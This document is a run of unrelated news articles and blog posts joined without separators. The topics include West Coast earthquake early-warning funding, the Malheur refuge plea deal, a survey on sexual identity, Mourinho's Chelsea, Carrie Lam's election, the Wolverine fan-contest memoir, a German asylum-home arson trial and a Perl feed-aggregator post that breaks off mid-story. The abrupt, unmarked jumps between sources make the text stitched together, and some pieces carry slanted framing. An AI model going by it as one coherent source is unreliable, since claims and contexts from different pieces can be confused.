Next steps
By providing earthquake early warnings, everyone wins: people, businesses and science. So what is the hold-up? The answer is the allocation of money — and responsibility. Although US federal and state budgets are tight, the $120-million price tag to build and operate a West Coast system over 5 years works out at roughly $2.44 per person for the populations of California, Oregon and Washington. My morning coffee costs me $2.40.
What is needed to move forward is a partnership between leaders from state and federal politics, businesses, government agencies and science. Some individuals are making headway, but more must do so.
California State Senator Alex Padilla (Democrat) introduced a bill to build an earthquake early-warning system in the state, and successfully manoeuvred it through the legislature, where it was passed unanimously this September and was signed into law by Governor Jerry Brown. The governor's office of emergency services is charged with finding the necessary funding. Start-up funds are needed now, to maintain momentum. To cover the West Coast, governors and state legislators in Oregon and Washington will need to take similar steps.
Federal legislators must also take action. A number of California representatives, led by Congressman Adam Schiff (Democrat), have expressed bipartisan support for a warning system. However, with the House Interior Appropriations Bill now stalled, there is no prospect of funding this year. The USGS stands ready to deliver earthquake alerts, but it needs an extra $16 million a year to operate and maintain the system.
“By providing earthquake early warnings, everyone wins.”
Partnerships between the USGS and other federal agencies are needed. The US National Science Foundation should fund the expansion of geophysical networks in zones of high seismic hazard. The Department of Homeland Security and its Federal Emergency Management Agency should support earthquake early warning as a public-safety issue.
Business leaders must also advocate the value of a warning system more strongly. John McPartland, a member of the board of directors for Bay Area Rapid Transit, has recognized and spoken widely about the need for it. Others should step forward in the many sectors that are affected by severe earthquakes.
Other regions should implement early-warning systems before their next big quake. European researchers are poised to do so, but are waiting for funding. The United Nations Educational, Scientific and Cultural Organization should continue to help in promoting the technology in other earthquake-prone areas around the world.
The scientific community provides information about the likelihood of earthquakes and their effects. But I believe that it is also important to use its expertise and authority to apply moral pressure on leaders. Although some researchers will prefer not to step out of their ivory towers, earthquake scientists who are keen to see progress must gain knowledge of and access to the policy-making process.
As Padilla commented to a colleague during the California Senate hearings for his earthquake bill: “I know you don't want to be sitting here with me after the next big one if we have not deployed this system.” I am happy to give up tomorrow's coffee in exchange for a warning before the next big shake.
Robert "LaVoy" Finicum and Ammon Bundy (Fox News/screen grab)
A participant in the Oregon militia standoff at a wildlife refuge pleaded guilty to conspiring against the federal government on Thursday, making him the first of 26 jailed protesters to accept a deal with US prosecutors.
Corey Lequieu, 46, pleaded guilty to using force, intimidation and threats to impede federal officers at the Malheur national wildlife refuge, where a group of activists, some heavily armed, staged an occupation in January to protest the government's treatment of ranchers.
Brothers Ammon and Ryan Bundy, who helped lead the protests, refused to enter pleas at their arraignments, resulting in a a judge entering a “not guilty” plea on their behalf, paving the way for a high-profile trial.
“It was the best option available,” Lequieu's girlfriend Debra Carter Pope said in an interview Thursday. “What's important to him and to me is family. … It's better than being in there for years and years.”
Federal prosecutors have recommended that Lequieu spend two-and-a-half years in prison and have agreed not to level any additional charges against him, according to the Oregonian. In the government's indictment he had originally faced two additional charges related to his possession of firearms at the bird sanctuary.
The conspiracy charge for which Lequieu pleaded guilty carries a maximum sentence of six years.
The activists took over a number of government buildings at the refuge headquarters to protest the imprisonment of two eastern Oregon ranchers convicted of arson offenses. The Bundy brothers and their supporters have argued that the federal government has no right regulating public lands in the west and have continued to argue in court that US prosecutors lack jurisdiction in the case.
Their philosophy gained traction in the west in 2014 when their father Cliven Bundy staged a standoff with the federal government at the family's ranch after refusing for years to pay grazing fees. Cliven, too, is behind bars, awaiting trial for the 2014 standoff and has also refused to enter a plea.
Lequieu and his girlfriend, who are from Fallon, Nevada, were both regular presences at the refuge, though Carter Pope, who was one of the main cooks for the protest, was not arrested or charged.
During the second week of the protest, Lequieu told the Guardian that he works for a hauling company and that he was prepared to stay at the occupation for a long period, though would eventually have to go back to work. He left the site after numerous protesters were arrested and Oregon police shot and killed LaVoy Finicum, a major occupation spokesman.
Angie Bundy, Ryan's wife, said she was surprised to see a defendant had pleaded guilty – noting that her husband and their supporters feel strongly that they are innocent. “He's not guilty of any crime. He didn't do damage to anybody.”
She added, “My husband's standing on principle. He's looking at the larger picture. … He's not going to plead guilty.”
Carter Pope noted that as part of the plea deal, Lequieu has made clear that he is not cooperating with prosecutors. “There's no way he would've cooperated. He doesn't want anyone to think he's a snitch. He's not.”
Lequieu will also have to pay restitution to the government and will remain in custody prior to a 25 August sentencing.
We talk about Big Oil and Big Pharma and Big Ag. Maybe it's time we started talking about Big Internet.
That thought crossed my mind after reading a couple of recent posts. One was Scott Rosenberg's piece about a renaissance in the ancient art of blogging. I hadn't even realized that blogs were a thing again, but Rosenberg delivers the evidence. Jason Kottke, too, says that blogging is once again the geist in our zeit. Welcome back, world.
The other piece was Alan Jacobs's goodbye to Twitter. Jacobs writes of a growing sense of disillusionment and disappointment with the ubiquitous microblogging platform:
As long as I've been on Twitter (I started in March 2007) people have been complaining about Twitter. But recently things have changed. The complaints have increased in frequency and intensity, and now are coming more often from especially thoughtful and constructive users of the platform. There is an air of defeat about these complaints now, an almost palpable giving-up. For many of the really smart people on Twitter, it's over. Not in the sense that they'll quit using it altogether; but some of what was best about Twitter — primarily the experience of discovery — is now pretty clearly a thing of the past.
“Big Twitter was great — for a while,” says Jacobs. “But now it's over, and it's time to move on.”
These trends, if they are actually trends, seem related. I sense that they both stem from a sense of exhaustion with what I'm calling Big Internet. By Big Internet, I mean the platform- and plantation-based internet, the one centered around giants like Google and Facebook and Twitter and Amazon and Apple. Maybe these companies were insurgents at one point, but now they're fat and bland and obsessed with expanding or defending their empires. They've become the Henry VIIIs of the web. And it's starting to feel a little gross to be in their presence.
So, yeah, I'm down with this retro movement. Bring back personal blogs. Bring back RSS. Bring back the fun. Screw Big Internet.
But, please, don't bring back the term “blogosphere.”

A new study, which attempts to correct for problems with current survey methodology (even when anonymous we don't always answer honestly), finds that 19 percent of Americans don't consider themselves heterosexual.
Since the classification of modern homosexuality in the 19th century (PDF), society's perception and acceptance of people who have sex with others of their own gender has grown considerably. One continued argument against the widespread acceptance of individuals who belong to that group, though, has to do with its relative size.

At TheAtlantic Garance Franke-Ruta wrote that Americans seem to think there are a lot more gay people in the world than there actually are. As she explained last year, “surveys show a shockingly high fraction think a quarter of the country is gay or lesbian, when the reality is that it's probably less than 2 percent.” Anthropologists, a notably tolerant group, often consider homosexuality, due to its rarity, an aberrant behavior, like alcoholism or drug abuse, promiscuity or violence.
But new research indicates that the real prevalence of homosexuality might be a lot higher than previously thought.
The most-cited guess as to what percentage of individuals are homosexual is around 10. Some LGBTQ college groups have even named their clubs things like The 10% Society, despite the fact that, at some schools (e.g. Bob Jones University), the percentage of past and present homosexual students is likely much lower, and at some others (Sarah Lawrence or Smith) it might be a considerably higher.

That number is based on Alfred Kinsey's 1948 study, "Sexual Behavior in the Human Male," in which the Indiana University researcher concluded that 10 percent of American men "were predominantly homosexual between the ages of 16 and 55." While Kinsey also said that “males do not represent two discrete populations, heterosexual and homosexual,” and, mixing his metaphors here, “the world is not to be divided into sheep and goats. Not all things are black nor all things white,” the 10 percent number has been repeated for more than 60 years now. (Engaging in homosexual sex between the ages of 16 and 55 is not exactly everyone's idea of “gay”—in contemporary understanding it's something more like the idea of being attracted to a member of one's own sex, regardless of regular sexual interaction—but Kinsey's estimate is the closest we've come to a widely-agreed-upon percentage.)
But it's possible that most past and present surveys of homosexuality might have been misleading participants, and the size of the LGBT population could be a lot bigger than 10 percent. That's according to a new study by researchers from Ohio State University and Boston University published by the National Bureau of Economic Research. Katherine Coffman, Lucas Coffman, and Keith Marzilli Ericson indicate that the true percent of the population attracted (if not necessarily exclusively) to their own gender may be almost 20 percent. According to their study:
We run an experiment on 2,516 U.S. participants. Participants were randomly assigned to either a “best practices method” that was computer-based and provides privacy and anonymity, or to a “veiled elicitation method” that further conceals individual responses. Answers in the veiled method preclude inference about any particular individual, but can be used to accurately estimate statistics about the population. Comparing the two methods shows sexuality-related questions receive biased responses even under current best practices, and, for many questions, the bias is substantial. The veiled method increased self-reports of non-heterosexual identity by 65% (p<0.05) and same-sex sexual experiences by 59% (p<0.01). The results show non-heterosexuality ... [is] substantially underestimated in existing surveys.
When asked directly, 11 percent of survey participants said that they did not consider themselves heterosexual. When asked indirectly, some 19 percent of participants indicated that they did not consider themselves heterosexual. This discrepancy was exposed due to some pretty interesting methods, particularly the use of “blind” questions. In the direct method, which resulted in the 11 percent response, participants were asked to answer a simple yes or no to the question “Do you consider yourself to be heterosexual?”
In the indirect, or “veiled” method, the survey asked people to choose between 0 and 4 to indicate their agreement with the statement “I consider myself to be heterosexual.” The results don't necessarily mean that 19 percent of the population is composed of exclusively gay men and exclusively lesbian women, but rather that a significant percentage of the population is unwilling to position themselves at either extreme end of a spectrum.
Using the direct method, 17 percent or survey respondents indicated that they had had a same-sex experience. But using the veiled method, the researchers concluded that some 27 percent of participants appear to have had some same-sex experiences.
The research was not an attempt to measure the actual size of the country's gay and lesbian population. And the researchers are careful to temper their findings by cautioning that the survey respondents did not represent a random sample of the adult population. In fact, they note that their study group was younger, more educated, more politically liberal, and less likely to identify as Republican or to describe themselves as being at least “moderately religious” than the rest of the country.
The most important takeaway isn't a final tally of the gay people in society, but, rather, an understanding of the ways in which surveys and other existing attempts to measure such things might be slightly misleading. “The results show non-heterosexuality and anti-gay sentiment are substantially underestimated in existing surveys, and the privacy afforded by current best practices is not always sufficient to eliminate bias,” note the researchers, who were just looking at the way surveys might under-count both homosexuality and attitudes toward homosexuality.
Many gay activists (and human sexuality experts) resist putting humans into exclusive sexual boxes at all. The rate of homosexual behavior in America's prison system, after all, might be as high as 75 percent. And homosexual behavior among the male aristocracy of Ancient Greece was widespread, at least if we believe Kenneth Dover, the first modern scholarly writer to discuss the issue.
As Gore Vidal wrote, over and over: “There is no such thing as a homosexual or a heterosexual person. There are only homo- or heterosexual acts. Most people are a mixture of impulses if not practices.” We should probably not worry so much about who is gay so much as recognize that lots of people could potentially do something defined as gay.
“If someone as deluded as I was can be brought out of homosexuality then surely anyone can,” said Joe Dallas, the speaker at Focus on the Family's Love Won Out conference. Another way to think of this, however, is that people can also be brought into it. Sexuality is complicated, and our experiences in the bedroom shift, particularly in the case of some members of the ex-gay movement.
Just don't expect most surveys to measure how often this sort of thing occurs. It turns out people often don't answer honestly even when they're anonymous.
Can Jose Mourinho build on last season's success and sustain a winning side for years to come?
The team Rafael Benitez found when he arrived in Milan in 2010 was spent. Barely a few weeks before, Internazionale had completed an historic treble under Jose Mourinho, adding the Champions League to the Serie A title and Coppa Italia they had already won, but after a few days of preseason training, it was obvious something was missing.
Psychologically, the success they had enjoyed the previous year had sated them, blunting the sharp edge of hunger. Physically, they had little left in the tank. Most of the players were at their peak, in their late 20s and early 30s, and there was little youthful energy coming through the ranks to push them, to replace them.
Throw in a few mistakes from the owner, Massimo Moratti, who failed to realise the need to refresh a winning team, and a few from Benitez -- who failed to win over a group of players unflinchingly loyal to his predecessor, and struggled to adapt to Italian football -- and what happened next was inevitable. A bright start petered out. Results turned and the atmosphere soured. Benitez left at Christmas.
Those few unhappy months -- brought back into the public domain last week, thanks to the sort of exchange of jibes between Benitez and Mourinho that does not make anyone involved look good -- serve to prove two points. One is that the hardest thing to do in football is to build on success. As Manchester City, for example, might acknowledge, winning the second title is substantially trickier than picking up the first. And the other is that Mourinho always gets out at the right time.
The Portuguese doubtlessly would have done better with that Inter side that year than Benitez (or any of the dozens of managers who have followed). The players adored him. He might have been able to draw a little more running out of their tired legs. He might have persuaded Moratti, whose one aim had been to bring Inter the European Cup, like his father, to part with a bit more cash.
But he was not around to find out. Almost as soon as his side had seen off Louis van Gaal's Bayern Munich in the Champions League final, he left, signing up for three years at Real Madrid. It was the quintessential Mourinho move: a brief, glorious stay, turning his club into a magnet for trophies, then he was off to repeat the trick elsewhere. He has always been seen as a manager for today, not tomorrow.
He has never been one to stick around: two years at Porto -- culminating in another domestic and European treble; two years at Inter; three at Real Madrid; three and a few months in his first spell at Chelsea.
His sides have always had the air of being at their peak. Goran Pandev, almost 27, was the youngest starting member of that Inter team in Madrid; Mourinho's signings while he was in Italy included Lucio, Diego Milito and Samuel Eto'o, none of them exactly spring chickens. I asked him a few weeks ago about his lack of experience at bringing through young players. Mourinho took umbrage, pointing to the Porto side he had made champions of Europe. Of the 11 players who started in Gelsenkirchen in 2004, only one, Carlos Alberto, was under the age of 25.
None of this is a criticism of Mourinho. He is without question one of the two finest managers of his generation; whether he comes out on top depends largely on how you feel about football's eternal debate about aesthetics and effectiveness.
But the one thing that Mourinho so far has not done is the one thing that separates the managers who can be considered the greats of their own time from those who can be viewed as the greats of all time. He has never built a dynasty. He has never built one side, seen it come to its natural peak, and then built another one just as good. He has always left too soon.
The 52-year-old is aware of the hole in his CV: that much is obvious from how keen he is to claim credit for all that Chelsea achieved between his departure in 2007 and his return in 2013. As far as Mourinho is concerned, the double they won under Carlo Ancelotti is partly his, and so is the Champions League they claimed under Roberto Di Matteo. He does not count the Europa League they picked up in 2013, partly because it was only the Europa League, but mainly because Benitez won it, and their enmity precludes either man giving the other any credit for anything. Ever.
Mourinho, of course, has a point here. He not only put the bulk of that side together, he gave it its characteristic Mourinhismo, its refusal to countenance defeat, its steely determination, its heart and its soul. Those were Mourinho's triumphs in some measure, and not just because he texted the players before and afterward.
But he has still not built a dynasty. He built a side that lasted for a decade, a quite astounding achievement, but he has yet to meet the ultimate challenge management has to offer: breaking up a successful team and replacing it with one just as good or even better. Part of the appeal of a return to Chelsea, without question, was that it offered him the opportunity to do just that.
It is worth considering, at this point, what football's finest empire-builder considered key to that process. Sir Alex Ferguson managed to produce at least three entirely distinct teams in his time at Manchester United (the Eric Cantona team, the Class of '92, the Cristiano Ronaldo-Wayne Rooney-Carlos Tevez triumvirate, though this can be broken up into smaller groups if you're that way inclined). He did not build a side. He built a club.
When the Harvard Business Review delved into how he had done that, they unearthed a handful of what their readership no doubt referred to as "key learnings." He built from the bottom, "giving young people an opportunity to succeed." He was ruthless in his treatment of loyal servants he deemed to be past their best. "If you see the deterioration, you have to ask yourself what things are going to be like two years ahead."
Ferguson created a winning culture where hard work was the only approach tolerated, to such an extent that "in later years, a lot of my staff would already be there when I got in at 7 a.m." He kept a core of veterans around to pass on the message to those who were new to the system. He made sure he was the dominant personality at the club, that no challenge to his authority was even countenanced. He made himself a sort of tracksuit-clad Sauron, observing everything, making sure he could see the bigger picture, rather than being bogged down in the minutiae of conducting training. He changed with the times, never relying on what had served him well in previous years. He sought constant improvements.
Jose Mourinho won another pair of trophies with Chelsea in 2014-15, but he has yet to build a dynasty in West London.
These are lessons Mourinho seems to have taken to heart. The decision to replace Petr Cech with Thibaut Courtois in goal highlighted the first two rules: Give young players a chance and be prepared to be ruthless. The third -- establishing a winning culture -- has long been Mourinho's hallmark. It was what marked out his first great Chelsea side. The change he has wrought in Eden Hazard, convincing a talented soloist to tailor his gifts to the orchestra in the pursuit of victory, is evidence that he has not lost his touch, that there is an identifiable characteristic within Chelsea that is inspired and descended from him.
For Mourinho's second spell at Chelsea, it is a promising start but there's some way to go. He will never be the dominant personality at Chelsea -- that's owner Roman Abramovich -- and that leaves him vulnerable if he cannot maintain success in the short term. Ferguson had four years to lay the foundations; if Mourinho takes one misstep, if the process of change is not managed perfectly, Abramovich theoretically could dispense with him.
And we do not yet know whether Mourinho has a second trick up his sleeve. Ferguson's sides were all stylistically different: the Class of '92 did not play in the same way as Ronaldo, Rooney and Tevez. All of the Portuguese's teams are broadly similar. The history of football teaches us that at some point, the magic rubs off, that your opponents work out a way to beat you.
If Mourinho is to build a separate side from his first, he will need to create for it a separate identity. In the first few months of last season, it looked like he was doing precisely that. Chelsea had become more expansive, more attractive. As soon as the injuries and suspensions mounted, though, he reached for his comfort blanket, the one that smothers games.
Toward the end of last season, Mourinho suggested he would return to the more stylish approach in order to defend his title. It will be intriguing to see if he does, to see if he can create something new from the old, to see if he can find another way of winning, to see if he is ready to do what only the true greats do.
This is the year when we will find out if Mourinho can create a second-generation masterpiece.

Carrie Lam, Beijing's Favored Candidate, Elected To Lead Hong Kong
Enlarge this image toggle caption Anthony Wallace/AFP/Getty Images Anthony Wallace/AFP/Getty Images
After winning an election conducted amongst Hong Kong's biggest Beijing supporters, 59-year-old former civil servant Carrie Lam said her priority would be to "heal the divide" in Hong Kong society, vowing to form a government based on talent, not connections.
After more than two years of protests over the city's political future, this seemed to be what her city needed to hear, and saying the right thing at the right time was precisely what catapulted Lam to this position in the first place.
Lam's popularity among China's communist leadership soared when the then-chief secretary — the city's second-in-command — helped Beijing lead an effort to overhaul the city's election process. Up until then, Hong Kong's government had listened to public opinions about how it should implement the rights of all city residents to vote for their chief executive. Hong Kong's Basic Law, or mini-constitution that was adapted after the city was handed over to China in 1997, promises universal suffrage. But in August of 2014, Lam helped unveil an electoral reform proposal that promised voting rights for all city residents, but only after Beijing selected its own candidates.
The city reacted swiftly: Tens of thousands of protesters shut down the city's financial district for more than two months, sparking what later became known as the "Umbrella Revolution," named after the umbrellas used by protesters to shield themselves from police tear gas.
After the streets were cleared and the tear gas dissipated, the electoral reform proposal championed by Beijing and Carrie Lam failed. But Lam, who ably represented the government in negotiations with protesting students that autumn, had proven herself worthy of Beijing's blessing.
But how will Lam's knack for behind-the-scenes negotiations and policymaking help her in Hong Kong's top leadership spot? With Beijing increasingly interfering in Hong Kong's affairs, there has never been a more difficult time to be chief executive of the city.
Lam's first big challenge may come on her first day in office. July 1 is the 20th anniversary of Hong Kong's handover to China, and Chinese leader Xi Jinping will likely be in attendance for the event. Umbrella Movement leaders are already planning mass demonstrations to protest the event, and it'll be the first chance Carrie Lam will have to make good on her promise to try to heal the divide in Hong Kong society.

Major conservative news outlet Breitbart is selling fidget spinners with Stephen Bannon's face on it, less than a week after the former chief strategist to President Trump left the White House to resume his leadership position at the site.
Fidget spinners, a toy that's gained new popularity in 2017, spin around in users' hands and fingers.
The orange Bannon spinners have a photo of Bannon and "#WAR" written under him on one side, a reference to a recurring Breitbart motto. The other side features the Breitbart logo. Breitbart's website promises that the Bannon toy will spin for two minutes.
The website's online store offers a single spinner for $7.95.
Advertised as a way to give liberals “something to do between pulling down monuments," a reference to recent controversies over Confederate monuments, the website jokes that it could comfort leftists "at times like these."
"Leftists need comfort at times like these," the spinner's description reads.
Breitbart staffers celebrated Bannon's return to the site last week, but others have lashed out at Trump for removing him from the White House, with one Breitbart editor declaring "war" after Bannon's ouster.
[2014 update: this is a very old, very silly article. PC gaming has changed a lot since then, as have my beliefs. Please don't take it too seriously.]
I had originally considered a more moderate title for this post, but I thought a bit of tongue-in-cheek flame baiting might be fun. First, a bit of exposition: outside of the RTS genre, I'm a dyed-in-the-wool console gamer. PC elitists frequently scoff at console controls, the mouse and keyboard interface for shooters becoming a virtual sacred cow among those raised on Quake and Unreal Tournament. As someone who loves lively pointless debating, I've decided to strike back and offer my perspective on why console gaming is better than PC gaming.
#1: The Posture
To quote Bill Nye the Science Guy, consider the following:
Gamers and couches go together like zombies and shopping malls. Let's face it, most sedentary relaxing activities take place on a couch. They're comfortable for both sitting and lying down and it's virtually impossible to get any work done while on one. Now contrast this with the following:
I dare anyone to try and play a PC shooter in anything but an upright sitting position. Call me lazy (true) and insult my posture (also true), but after working at a computer all day I have no interest in assuming the same position in my leisure time.
#2: The Controls
As any handyman will tell you, use the right tool for the job. Let's face it, standard keyboards are not designed with gaming in mind. Moving with the WASD control scheme is at best like writing a novel with an oversized novelty pencil; you can do it, but it's sub-optimal and there are better tools available.
Of course, what PC gamer gladly clamour about is the precision of mouse aiming. This is, of course, a strong point of contention in my mind. See, I like a bit of imprecision in my shooter games; it gives a game that run-and-gun, “relying on instinct” feel. The precision needed to headshot someone from half a mile away with a mouse is more akin to the later levels of Trauma Center: Under the Knife than to an actual firearm.
#3: The Cost / Technical Requirements
Gaming is an expensive hobby, just ask any PS3 owner (zing). However, this cost is compounded by the ridiculous system requirements of cutting edge PC games. To keep up requires frequent upgrades to your system. Ponying up $500 for a new video card to run Crysis on the lowest graphics setting is utterly inconceivable in my mind.
Furthermore, with the endless PC hardware permutations it's often a toss up as to whether or not a game will run on your particular setup. If it doesn't, you have hours of potentially fruitless forum reading / driver & patch downloading ahead. As a software engineering student, I'm a fairly technically minded guy, but even I prefer the convenience of coming home with a console game and knowing that it will work from the moment I put the disc in.
Conclusion
Before I loose this fairly inflammatory piece on the world, I'd like to emphasize its generally facetious nature and also make a few concessions. I'm well aware that PC gaming does many things spectacularly well. One could argue that most console games are ported over PC eventually, so the game selection is rather terrific (although lacking in Nintendo and platformers). While Xbox Live and Playstation Network are good and getting better, they're years behind the online capabilities of PC games. The modding community is also especially top-notch, and having complete control over the platform you play on is definite boon. It's that very control that, unfortunately, leads to gross inconvenience when things don't work.
Ultimately, your choice of platform comes down to a cost-benefit analysis with your own particular values. As someone who appreciates convenience, comfort and cost over customization, processing power and control precision, I'm going to stick with console gaming. Snobbery is for jerks; either way you choose to game, game on!
Teevee news on Election Day was like four weddings and a funeral, with CBS, ABC, NBC and CNN betrothing themselves to the grandiosity of the moment and its dowry of Transformation and Change and Transcendence and Changeformendence, and Fox News' staff fulfilling their role as the sulky outsiders, with sad-faced Brit "Napoleon Dynamite" Hume glumly narrating the evening that a billion hours of anti-ACORN hysterics couldn't, in the end, forestall. The ratings for Fox weren't that great, either, which is too bad, because watching them morosely go through the motions whilst the other news organizations showed off their heroic music and spangles and terrifying hologram technology was a fascinating thing to behold.
Jon Stewart, from the sounds of things, did take the time to watch the Fox crew perform their Election Night duties, and was fortunate enough to have Chris Wallace, host of Fox News Sunday, on hand to discuss the evening. "How long do you sit shiva?" Stewart asked Wallace, who related that "we're all really happy" except for Sean Hannity, "who is too busy in the bathroom crying." Wallace, does, as Stewart suggests, "have his moments," but not cracking jokes -- though, to be fair, that whole "ACORN was a legitimate story" line does get a lot of laughs. Anyway, here's a clip of Jon Stewart gloating in front of Chris Wallace.
A couple of weeks ago, Bleeding Cool ran an article looking at an entry to Marvel's FOOM Magazine's create-a-superhero contest, the results of which ran in 1973. One of the runners-up was Andy Olsen and his creation “The Wolverine”.
Six months later, Incredible Hulk #180 with the first appearance of Wolverine, was published by Marvel. The rest is history.
Bleeding Cool managed to track down Andy Olson and asked him what he remembered of that time.
He didn't hold back.
Funny how some things stick with you.
It all started in the dark ages. So long ago it would be easy to forget.
The time of analog.
Boys my age had fewer creative outlets, computers were almost science fiction, gaming consisted of various boards and cards made of paper.
Paper. The ancient medium of Gutenberg was my entertainment refuge in the form of printed color comic books and Marvel was the publisher of my fantasy world.
Much of my school age days were consumed with buying, reading, collecting and discussing with my friends comic book hero plot lines, and artworks of the giants – Jack Kirby, John Romita, Steve Ditko to name a few were almost revered and Stan Lee ruled them all.
It inspired me to draw and create my own versions of what I hungrily read and blow my meager allowance money on issue after issue. Thor, Captain America, Hulk, Iron Man, Fantastic 4, I was totally into the Marvel Universe.
So I think in 1973 or 4 Stan Lee announced a magazine catering to his fan base called FOOM (Friends Of Marvel – what the Os stood for eludes me..Obnoxious? Oligarch?..Opportunist? ..Oh well..) I happily subscribed. As I recall it was a cheaply printed 2 or 3 colored mags supposedly under direction of The Man himself.
At that time I was mediocre scholastically but not too bad in art class with dreams of becoming an artist, perhaps a comic book artist. I was a sketching fiend drawing incessantly anything that struck my fancy.
Sometime during the short production of FOOM Stan ( I really don't know if it was him personally but his name was all over it so I'll refer it all to him. Yes I know it was never a one-man show there. ) announced a fan contest.
Hey kids! Design your own superhero! or villain! – send in your idea, sketch to us and Stan himself will pick the winner! The winner will become a Marvel comic book hero! WOW!!
I knew there would be hundreds of entries but just the thought of The Man actually seeing my work was simply too exciting to pass up.
So I gave it some thought.
First you need a a name.. For some reason it always seems to describe the hero.
You never have a superhero named Larry or Bob.
So I looked for an interesting name to build off.
Bats, nope, spiders, done, koalas, too cute.
I had heard of a creature called wolverine. From what I knew it was reputed to be pounded for pound the meanest animal on Earth. Not even Grizzly bears would tangle with one. A worthy attitude to have when fighting crime. Wolverine it was.
So I set on using that as a base concept. If you notice in my adolescent sketch there is a pattern on the back of his costume that mimics the fur shading of the animal as well as the front mask sort of like the markings of its head.
The details other than that eludes me, but looking back at the sketch he seemed to have a metal skeleton and no claws, because I couldn't imagine a superhero scratching an opponent. Sissies scratch.
I sat down and worked up my sketches eventually working up a finished drawing to send off.
I also created a villain named Krypt. As I recall he was a part cyborg fellow who was pissed off at almost everything. I thought the name sounded cool…
God, does anyone use “cool” anymore?
Well some weeks went by and the issue announcing the contest results was delivered.
To my surprise and pleasure both my entries made it to the runner ups or honorable mention. The winner was called Hu-man or something like that. Good for him.
I knew hundreds of other kids were out there just as excited and creative as I so the fact that Stan Lee took time off his coffee break to sort through a stack of kid's sketches and toss mine into the “do not trash” pile was a thrill.
No money, trophy, or notice was given just a reprint of my sketches in an obscure fan magazine.
Excited, I mentioned this to my uncle who was an established commercial artist on Madison Avenue (that's in NYC for those who don't know) who replied: “You did WHAT?? You idiot! Don't you know what these guys did? They pulled ideas from you kids, make money off it and paid you NOTHING!!” Probably using other colorful words. But that's the best I could remember. Feel free to insert your own.
I felt rather used and stupid.
That was the end of it, time moved on and so did I. Even comics lost my interest, but not art as a field of study.
Fast forward a few years later as a college student I passed as comic book stand and noticed a large X-Men Marvel title: Wolverine.
WTF..and really-XMEN?
Of all the Marvel heroes- X-Men I felt were the bottom feeders.
Then it hit me. I had been had..Uncle was right.
My regard for Marvel and Stan Lee was so high it never dawned on me the contest was harvesting concepts to breath some freshness into their line up.
I recall also seeing the title Krypt in another comic, but the damage was already done.
I toyed with the idea of pursuing it.. I could not recall if a waiver was part of the contest. I never signed one or read anything stating entering the contest removed all rights from the originator.
I was an art student.. If I was pre law perhaps things would be different..
Could Marvel claim plausible deniability? Perhaps. They did add their own scratchy claws and scruffy beard.
Nice they kept the metal skeleton I roughed out -what ever adamantium is.
I often wondered, It's quite possible other titles in use today are from ideas from other kids that entered along with me. Who would know?
So I chalked it up to a lesson learned and concentrated on my own career in graphic design.
I made a point to never enter such contests again and council others to be wary as well.
With one exception.
In later years I joined Siggraph and entered some 3D animation into a contest which placed in the gold category. I felt secure that the recognition was genuine and the whole thing was altruistic in purpose.
So there it is.
Is this a case of ripping off a naïve kid's concept or simply a large multi-million dollar publishing company creating a character completely on its own and this all an interesting coincidence.
Any legal scholars are welcome to give an opinion.
I thank you, Rich for seeking me out all the way from the other side of the pond to remind me and give me a little recognition.
Perhaps my aspiration came true after all.
If anyone would like to see what I have been up to:

The fur is flying at New York City's Algonquin Hotel, where the literary lights of the Round Table used to exchange witty remarks over lunch.
One of the hotel's other traditions is the succession of cats that have had free run of the place for 80 years. But that tradition has ended.
The New York Post reports that city health inspectors have banned the current cat, Matilda, from roaming the lobby.
The city department of health says pets are not allowed in areas where food is served. And the Algonquin serves food in the lobby.
The Post says Matilda is now on a leash behind the check-in desk or out of sight on a higher floor.
The blue-eyed cat took up residence last winter. She's the 10th Algonquin cat since 1932.
Three asylum seekers who are suspected of setting an asylum centre on fire in the German town of Hövelhof-Staumühle in January are now on trial for arson.
The trio of asylum seekers, aged between 20 and 26, are said to have been “frustrated” with their accommodation at the asylum home which was converted from a former military barracks. They are said to have made threats to the workers at the home the day before claiming that if they didn't have their demands fulfilled there would be a “massacre” Tag 24 reports.
Among their demands was to be moved to a different facility and they told the workers that they had been in conflict with other asylum seekers who came from Albania.
The prosecution states that two of the men, who are also brothers, smashed up the furniture in one of the rooms and then proceeded to light it on fire. The two brothers say that they did smash the furniture but left the room and only returned to discover the fire. The third defendant has refused to testify in the case.
As a result of the blaze which led to severe damages to the asylum home, 57 residents were injured. Of those injured 27 were immediately released while 30 others were taken to the hospital, one with serious injuries.
Thr asylum home was specifically set up for migrants from the Balkan region who were unlikely to receive an approved asylum claim. Though the home has space for around 900 migrants, only 500 were living at the facility at the time of the fire.
Several asylum homes across Germany have a similar issue in that they have space for many more migrants than they actually house. In some cases, it means the average cost of housing the migrants has soared because the homes expected full capacity and are locked into long contracts to feed, clothe and provide security. In one town 21 asylum seekers were costing the local government 500,000 euros per month.
Migrants setting their own accommodation on fire is also not uncommon. In Dusseldorf, a migrant set a massive fire at the city's exhibition centre because he was angry about not being woken up for breakfast during Ramadan last year.
Two migrants in Gößweinstein in Upper Franconia also set fire to their asylum home, though the act was thought to be caused by negligence. Two Syrian asylum seekers were smoking a hookah water pipe which uses coals that are thought to have caused the blaze which caused 100,000 euros worth of damage.
Long-time readers might remember that I once had a bit of an obsession with aggregating web feeds on sites that I called “planets”. I wrote Perlanet to make this job easier and I registered the domain theplanetarium.org to host these planets.
The planets I built were of varying levels of usefulness – but of all of them, planet davorg was the vanity project. It was simply a way to aggregate all the web feeds that I produced. There were feeds from various blogs along with things like Flickr, Twitter and CPAN.
One of the things I liked about planets was that they were self-maintaining. Once you've configured a planet, it will just keep on running (well, as long as the cron job is running). If the web feeds they are aggregating have new content, the planet will have new content. And many of the feeds that powered planet davorg were still running.
But last weekend I found a couple of problems with it. Firstly, it looked like it was designed by an idiot. Which, to be fair, it was. Web design was never my strong point. But we have Bootstrap now, so there's no excuse for web sites to look that bad. So that's how I spent the first hour or so – slapping a bit of Bootstrap paint onto the site. I think it now looks acceptable.
The second problem was that not all of the feeds were still running some of them (Delicious, for example) were just dead. I can't remember the last time I posted anything to Delicious – can you? So I spent some time tweaking and fixing the feeds (replacing CPAN with MetaCPAN, for example). Most of this was easy.
However, one feed was a problem. My Last.fm feed was dead. For over ten years I've been “scrobbling” ever song I've listened to and one of the feeds I was aggregating was that list. According to this page on their web site, my feed is supposed to be at http://ws.audioscrobbler.com/1.0/user/davorg/recenttracks.rss – and that was the URL in my Perlanet configuration. But it doesn't work. It returns a 404 error.
I tried to contact someone at Last.fm to find out what was going on, but I haven't got any kind of response. It looks like they've been running on a skeleton staff since CBS took them over and they don't seem to have the time to support their users (not, I suspect, a recipe for long-term success!)
But there was one possibility. You can get the same data through their API. And some quick experimentation, revealed that their API hasn't been turned off.
